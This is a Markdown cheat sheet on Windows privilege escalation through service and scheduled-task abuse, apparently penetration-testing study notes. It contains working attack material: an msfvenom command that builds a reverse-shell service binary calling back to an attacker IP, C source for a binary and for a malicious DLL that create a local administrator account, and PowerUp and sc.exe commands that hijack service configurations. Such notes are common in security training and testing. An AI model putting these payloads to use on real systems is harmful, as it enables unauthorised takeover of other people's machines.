---
label: Tasks and Services Abuse
---

# Tasks and Services Abuse to Privilege Escalation

## Services

A Windows Service is a background executable managed by the SCM (Service Control Manager) and is similar to daemons on Linux. Services can be managed by the Services snap-in, PowerShell, or the `sc.exe` command line tool. Windows uses the `LocalSystem`, `Network Service`, and `Local Service` user accounts to run its own services. Users or programs creating a service can choose either one of those accounts, a domain user, or a local user.

How to restart a service (try different methods!):

```powershell
# Stop service
sc.exe stop $service
net stop $service
Stop-Service $service_name

# Start service
sc.exe start $service
net start $service
Start-Service $service_name

# Reboot machine
shutdown /r /t 0 
```

> **IMPORTANT**: `sc.exe` (the `.exe` suffix is important!) 

### Binary hijacking

Each Windows service has an associated binary file. These binary files are executed when the service is started. If a lower authorized user is able to swap a binary that works as a service with higher privileges, there is a privilege escalation possibility. Once the service is restarted, the attacker's binary will be executed with the privileges of the service, such as `LocalSystem`.

PowerUp:

```powershell
# Get hijackable executables
Get-ModifiableServiceFile
```

Msfvenom has a special module for generating service binaries for Windows:

```powershell
# Generate rev-shell service executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attacker_ip LPORT=$port -f exe-service -o $output
```

You can also write something custom in C using the `system()` function:

```c
#include <stdlib.h>

int main ()
{
  system("net user $user password123! /add");
  system("net localgroup Administrators $user /add");
  
  return 0;
}
```

Compilation:

```bash
x86_64-w64-mingw32-gcc main.c -o main.exe
```

### DLL hijacking

By listing installed software or running services, we can find binaries vulnerable to DLL hijacking. If the binary is vulnerable to DLL hijacking (you can check it on the Internet), we can hijack the default DLL path and insert our own malicious DLL instead. Then wait until this binary is run (by the service or another user) and our malicious DLL file is executed with the other user's permissions.

> **REQUIREMENT**: Vulnerable DLL path must be writable for the current user to add inject a malicious DLL.  

How to find binaries vulnerable to DLL hijacking? One way is to use `Process Monitor` tool but unfortunately it requires to be run with administrator privileges. A workaround for this problem is to copy the binary to our local machine in order to investigate it further. Using `Process Monitor` we can identify unsuccessful attempts to access non-existent DLLs. These are the places where we want to inject our own malicious one.

The simplest malicious DLL in C:

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID lpReserved ) 
{
  switch (reason)
  {
    case DLL_PROCESS_ATTACH:
      int i;
      i = system("net user $user password123! /add");
      i = system("net localgroup administrators $user /add");
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    
    return TRUE;
}
```

Compilation:

```bash
x86_64-w64-mingw32-gcc main.cpp --shared -o main.dll
```

### Service modification

The service ACL might allow to reconfigure service settings. This allows an attacker to point a malicious executable to the service and even change the account which the executable is run with.

> **NOTE**: By changing service binary path to a _CMD_ command, it is possible to execute shell command after service restart.

[Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool might be necessary to check a service ACL .

```powershell
# Check the service ACL
accesschk64.exe -qlc $svc_name             

# Reconfigure service: run :exe-path with Local SYSTEM account
sc.exe config $svc_name binPath= "$exe_path" obj= LocalSystem
```

PowerUp module:

```powershell
# List modifiable services
Get-ModifiableService -Verbose              

# Abuse service and add user to local Administrators group
Invoke-ServiceAbuse -Name $service -UserName $user
```

#### Unquoted service paths

If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works like that. It allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.

Example:

```text
Unquoted binary path : C:\MyPrograms\Disk Sorter.exe

1st execution attempt: C:\MyPrograms\Disk.exe
2st execution attempt: C:\MyPrograms\Disk Sorter.exe
```

Indentify unquoted binary paths:

```powershell
# List potentially vulnerable service binaries
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
# List all services and their binaries
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# PowerUp module
Get-ServiceUnqoated -Verbose           
```

> **NOTE**: To drop an executable in the root `C:\` directory you need to actually fhave admin privileges so the unquoted `C:\Program Files (x86)\...` is basically useless.

For the exploitation we need to have rights to copy the binary to the vulnerable location and restart the service (or the entire system):

```powershell
# Check path permissions
icacls "C:\path\to\write"
```

## Scheduled Tasks

If the task runs periodically as `NT AUTHORITY\SYSTEM` or as an administrative user, then a successful attack could lead us to privilege escalation.

```powershell
# Get all scheduled tasks
schtasks /query /fo LIST /v

# Get paths of scheduled task binaries
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"

# Get scheduled tasks
Get-ScheduledTask
```

### Binary replacement

The most common tactic to exploit a scheduled task (when it's run on behalf of another user) is to replace it's binary. Sufficient permissions are required.

```powershell
# Check fule permissions
icacl $target_file
```
